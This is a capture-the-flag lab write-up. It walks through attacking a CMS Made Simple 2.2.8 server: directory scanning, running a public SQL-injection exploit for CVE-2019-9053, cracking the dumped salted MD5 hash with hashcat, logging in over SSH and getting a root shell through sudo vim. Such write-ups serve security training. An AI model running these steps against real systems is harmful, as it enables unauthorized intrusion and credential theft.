src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-807a-be77-e5be6e507a1f" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">curl $TARGET_IP/openemr-5_0_1_3
&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /openemr-5_0_1_3 was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at $TARGET_IP Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;</code></pre><p id="23f5b2cc-075b-800f-b6f2-f17998c3026f" class="">
</p><p id="23f5b2cc-075b-8018-99e1-d57c27a15067" class="">404, too bad for us. Let’s see what else might be on the server. <code>gobuster</code> is a good tool to rapidly scan a wordlist to discover directories and files on a web server.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-80f9-a72d-e5d9a15d57f7" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">gobuster dir -u http://$TARGET_IP -w /usr/share/dirb/wordlists/big.txt -t 128
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$TARGET_IP
[+] Threads:        128
[+] Wordlist:       /usr/share/dirb/wordlists/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/03 23:55:30 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/robots.txt (Status: 200)
/server-status (Status: 403)
/simple (Status: 301)
===============================================================
2020/06/03 23:55:40 Finished
===============================================================</code></pre><p id="23f5b2cc-075b-806f-bfd7-c4525cdcc54a" class="">
</p><p id="23f5b2cc-075b-80c6-a589-f64bd08c7dea" class="">The <code>/simple</code> URI looks interesting, let’s see what’s behind there</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-807a-b2e0-e5c1a0e2b639" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">curl http://$TARGET_IP/simple/</code></pre><p id="23f5b2cc-075b-80c2-9bb9-c9e6b6dcea2d" class="">
</p><p id="23f5b2cc-075b-80b0-bb94-f797f749fb7c" class="">I won’t print the response here suffice to say it’s quite dense. Let’s try via firefox.</p><p id="23f5b2cc-075b-8081-9b95-ece345766bf6" class="">On the home page, we see that we have a fresh installation of a CMS application called <code>CMS Made Simple</code></p><figure id="23f5b2cc-075b-80db-8dda-d15066f59660" class="image"><a href="https://hydragyrum.onrender.com/images/posts/thm-simple-ctf/cmsms-version.png"><img src="https://hydragyrum.onrender.com/images/posts/thm-simple-ctf/cmsms-version.png"/></a></figure><p id="23f5b2cc-075b-8013-8bf0-fb7e29a40a82" class="">Let’s try to see if there are any known exploits for this application. We can check google for any related CVEs. A CVE (Common Vulnerabilities and Exposures) is a record of a vulnerablity in a given application. It is typically given a number, preceded by it’s year of discovery. For example, <code>CVE-2019-1234</code> would be the 1234th vulnerability discovered in 2019.</p><p id="23f5b2cc-075b-8016-9752-c1345ed925e9" class="">Searching for CMS Made Simple 2.2.8, I got to the following site: <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-3206/product_id-5627/version_id-270038/Cmsmadesimple-Cms-Made-Simple-2.2.8.html">https://www.cvedetails.com/vulnerability-list/vendor_id-3206/product_id-5627/version_id-270038/Cmsmadesimple-Cms-Made-Simple-2.2.8.html</a></p><p id="23f5b2cc-075b-80e8-8e27-ffbb3a1ae59b" class="">We see 4 vulnerabilities, including an unauthenticated SQL Injection vulnerability: <code>CVE-2019-9053</code></p><figure id="23f5b2cc-075b-8049-a59f-d752390c4ac6" class="image"><a href="https://hydragyrum.onrender.com/images/posts/thm-simple-ctf/cmsms-cve.png"><img src="https://hydragyrum.onrender.com/images/posts/thm-simple-ctf/cmsms-cve.png"/></a></figure><p id="23f5b2cc-075b-8007-a86b-dc463248db38" class="">With this, we can answer the next 2 questions on the task:</p><p id="23f5b2cc-075b-809c-8214-e44e94b46b1f" class=""><strong>Question 3:</strong> What’s the CVE you’re using against the application? <code>CVE-2019-9053</code></p><p id="23f5b2cc-075b-809f-8baf-ca475f373939" class=""><strong>Question 4:</strong> To what kind of vulnerability is the application vulnerable? SQL Injection, abbreviated <code>sqli</code></p><h2 id="23f5b2cc-075b-80fa-b324-e1fe20264e4b" class="">Exploitation</h2><p id="23f5b2cc-075b-8084-bda4-ca60e3784966" class="">Now that we found a potential entry point, let’s go about exploiting it. We can lookup exploitdb for the CVE number, or we can use the exploitdb o kali:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-80e9-b7e8-d6c19fbdbbf6" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">searchsploit &quot;CMS Made Simple&quot;
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)    | php/remote/46627.rb
CMS Made Simple 0.10 - &#x27;index.php&#x27; Cross-Site Scripting                               | php/webapps/26298.txt
CMS Made Simple 0.10 - &#x27;Lang.php&#x27; Remote File Inclusion                               | php/webapps/26217.html
CMS Made Simple 1.0.2 - &#x27;SearchInput&#x27; Cross-Site Scripting                            | php/webapps/29272.txt
CMS Made Simple 1.0.5 - &#x27;Stylesheet.php&#x27; SQL Injection                                | php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities               | php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                     | php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution                                           | php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                  | php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                      | php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion                                          | php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure                                         | php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                   | php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                      | php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery                                      | php/webapps/12009.html
CMS Made Simple 1.8 - &#x27;default_cms_lang&#x27; Local File Inclusion                         | php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery               | php/webapps/34068.html
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                      | php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                                         | php/webapps/44192.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                         | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                         | php/webapps/45793.py
CMS Made Simple &lt; 1.12.1 / &lt; 2.1.3 - Web Server Cache Poisoning                       | php/webapps/39760.txt
CMS Made Simple &lt; 2.2.10 - SQL Injection                                              | php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                      | php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                 | php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload        | php/webapps/46546.py
-------------------------------------------------------------------------------------- ---------------------------------</code></pre><p id="23f5b2cc-075b-80ff-9674-efe8675e4750" class="">The one we want is the SQL Injection, we can see that it points to <code>php/webapps/46635.py</code>. On a Kali Linux, the exploits can be found at <code>/usr/share/exploitdb/exploits</code>.<br/>This one has a handy python script (In Python 2, unfortunately). We can <br/>copy it to a working directory and attempt to execute it.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-80a9-a2c5-e03cf6e68271" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">python 46635.py
[+] Specify an url target
[+] Example usage (no cracking password): exploit.py -u http://target-uri
[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.</code></pre><p id="23f5b2cc-075b-804d-b8a2-fb837c10c8ee" class="">
</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-80f5-b49e-f363ac1448ac" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">python3 46635.py -u http://$TARGET_IP/simple/
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96</code></pre><p id="23f5b2cc-075b-80c2-8634-cc7be8df81cd" class="">We have a salted hash for mitch. This looks like MD5, so let’s fire up hashcat.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-8045-9dfd-fb44283471be" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">hashcat -O -a 0 -m 10 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
hashcat (v5.1.0) starting...

OpenCL Platform #1: Advanced Micro Devices, Inc.
================================================
* Device #1: gfx900, 6732/8176 MB allocatable, 56MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Precompute-Merkle-Demgard
* Meet-In-The-Middle
* Early-Skip
* Not-Iterated
* Appended-Salt
* Single-Hash
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 51

Watchdog: Temperature abort trigger set to 90c

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

Approaching final keyspace - workload adjusted.

Session..........: hashcat
Status...........: Exhausted
Hash.Type........: md5($pass.$salt)
Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
Time.Started.....: Sat Jun 06 00:12:27 2020 (3 secs)
Time.Estimated...: Sat Jun 06 00:12:30 2020 (0 secs)
Guess.Base.......: File (D:\Downloads\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 10314.2 kH/s (2.04ms) @ Accel:256 Loops:1 Thr:256 Vec:1
Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 3094/14344384 (0.02%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: $HEX[4a6f6e617468616e3737] -&gt; $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util:  0% Core:1685MHz Mem: 945MHz Bus:16

Started: Sat Jun 06 00:12:05 2020
Stopped: Sat Jun 06 00:12:32 2020</code></pre><p id="23f5b2cc-075b-8052-a83d-c2c968c655d3" class="">Bash</p><p id="23f5b2cc-075b-8064-85b6-cd7fee27b0e3" class="">That didn’t work, though maybe the salt is prepended to the password before hashing. Let’s try that this time (hashcat mode 20)</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-80b3-82c1-e5e83b7fb8ad" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
hashcat (v5.1.0) starting...

OpenCL Platform #1: Advanced Micro Devices, Inc.
================================================
* Device #1: gfx900, 6732/8176 MB allocatable, 56MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Precompute-Merkle-Demgard
* Early-Skip
* Not-Iterated
* Prepended-Salt
* Single-Hash
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 51

Watchdog: Temperature abort trigger set to 90c

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:******

Session..........: hashcat
Status...........: Cracked
Hash.Type........: md5($salt.$pass)
Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
Time.Started.....: Sat Jun 06 00:15:30 2020 (1 sec)
Time.Estimated...: Sat Jun 06 00:15:31 2020 (0 secs)
Guess.Base.......: File (D:\Downloads\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   128.0 MH/s (2.22ms) @ Accel:256 Loops:1 Thr:256 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 3670908/14344384 (25.59%)
Rejected.........: 892/3670908 (0.02%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -&gt; smw1082
Hardware.Mon.#1..: Util:  0% Core:1684MHz Mem: 945MHz Bus:16

Started: Sat Jun 06 00:15:16 2020
Stopped: Sat Jun 06 00:15:33 2020</code></pre><p id="23f5b2cc-075b-80e9-b394-fb7f4993ae27" class="">Bash</p><p id="23f5b2cc-075b-80e9-8cb3-dd0d8f552014" class="">Bingo! we found the password. If we remember the note from earlier, We can now answer the next few questions:</p><p id="23f5b2cc-075b-80d1-8e94-cbb955f2723d" class=""><strong>Question 5:</strong> What’s the password? <code>******</code></p><p id="23f5b2cc-075b-8043-b15c-e2f0fb963de5" class=""><strong>Question 6:</strong> Where can you login with the details obtained? <code>ssh</code></p><h2 id="23f5b2cc-075b-8041-8222-d9044644dc91" class="">Gaining a Foothold</h2><p id="23f5b2cc-075b-809d-9085-d49f7e17e610" class="">Let’s see what we can see on the machine:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-809c-b806-d8440a65e145" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">ssh mitch@$TARGET_IP -p 2222
The authenticity of host &#x27;[$TARGET_IP]:2222 ([$TARGET_IP]:2222)&#x27; can&#x27;t be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#x27;[$TARGET_IP]:2222&#x27; (ECDSA) to the list of known hosts.
mitch@$TARGET_IP&#x27;s password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190</code></pre><p id="23f5b2cc-075b-80d9-ae52-f4f93fc496e3" class="">Bash</p><p id="23f5b2cc-075b-8075-9374-f5da82e8e04f" class="">Let’s look around and answer the next few questions</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-807b-8fe8-f3bf1da79456" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">cat user.txt</code></pre><p id="23f5b2cc-075b-80a4-b187-fd95d4da3f4f" class="">Bash</p><p id="23f5b2cc-075b-80b0-9187-f185c5da32dc" class=""><strong>Question 7:</strong> What’s the user flag? <code>******************</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-80eb-85f9-dbe5740b4470" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">ls /home
mitch  sunbath</code></pre><p id="23f5b2cc-075b-8089-ac27-f413faff5863" class="">Bash</p><p id="23f5b2cc-075b-8091-b83c-cbe7948b0a70" class=""><strong>Question 8:</strong> Is there any other user in the home directory? What’s its name? <code>sunbath</code></p><h2 id="23f5b2cc-075b-8041-90db-f8d8a384d555" class="">Privilege Escalation</h2><p id="23f5b2cc-075b-80b9-8017-ffe0d345b83f" class="">Getting into the machine is all well and good, but we want to get a user with actual rights ;). Let’s try to escalate to <code>root</code>. Oftentimes we can get a root shell by abusing misconfigurations in the system. <code>sudo</code> is generally a good first candidate to check. We can see what rights a user has using the <code>sudo -l</code> command.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-8087-90df-f9f2642c5c04" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim</code></pre><p id="23f5b2cc-075b-803b-b9a1-d47a876366f9" class="">Bash</p><p id="23f5b2cc-075b-8092-9afe-c50f60eeb773" class="">Vim<br/> is a text editor with many interesting features, one of which is <br/>spawning a shell. Running vim with sudo will allow us to then spawn a <br/>root shell!</p><p id="23f5b2cc-075b-806a-9b27-d3bc5f18ae6c" class=""><strong>Question 9:</strong> What can you leverage to spawn a privileged shell? <code>vim</code></p><p id="23f5b2cc-075b-8047-aca8-f5c22c088e75" class="">Let’s fire up vim.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-807e-8423-e298f3edc293" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">sudo vim</code></pre><p id="23f5b2cc-075b-80d9-8e79-f58131b34527" class="">Bash</p><p id="23f5b2cc-075b-80c5-aa13-fbb8c5d62712" class="">Once inside, we can spawn a shell with the following command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-80b8-a677-fa46e52f6bcd" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">:!bash</code></pre><p id="23f5b2cc-075b-80c3-a3ae-e91cbc8e0a5e" class="">vim</p><p id="23f5b2cc-075b-8083-98a6-e5b74411b0bd" class="">With that, we can readily grab the last flag and answer the final question.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23f5b2cc-075b-8014-9709-c6af11adfa97" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">cat /root/root.txt</code></pre><p id="23f5b2cc-075b-8006-a85d-e8ad35dae132" class="">Bash</p><p id="23f5b2cc-075b-8022-acdf-d0f19155c2af" class=""><strong>Question 10:</strong> What’s the root flag? <code>***********************</code></p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>